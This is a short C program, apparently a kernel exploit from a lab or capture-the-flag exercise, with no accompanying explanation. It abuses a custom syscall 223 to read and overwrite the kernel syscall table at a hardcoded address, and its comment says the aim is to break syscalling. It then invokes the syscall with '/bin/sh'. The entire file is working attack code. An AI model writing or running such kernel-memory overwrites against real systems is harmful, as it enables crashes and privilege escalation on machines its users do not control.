// Fucks up syscalling in the system by overwirting the syscall table
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>

int main()
{
	unsigned int info[3000] = { 0x61 };
	char * temp = (char *)malloc(3000);
    syscall(223,(char *)(unsigned int *)0x8000e348, (char *)info);
    puts((char *)info);

	syscall(223, (char *)info, (char *)(unsigned int *)0x8000e348+223); // override!
	syscall(223,(char *)(unsigned int *)0x8000e348, (char *)info);
	puts((char *)info);
	syscall(223, "/bin/sh", temp);
	puts(temp);

}   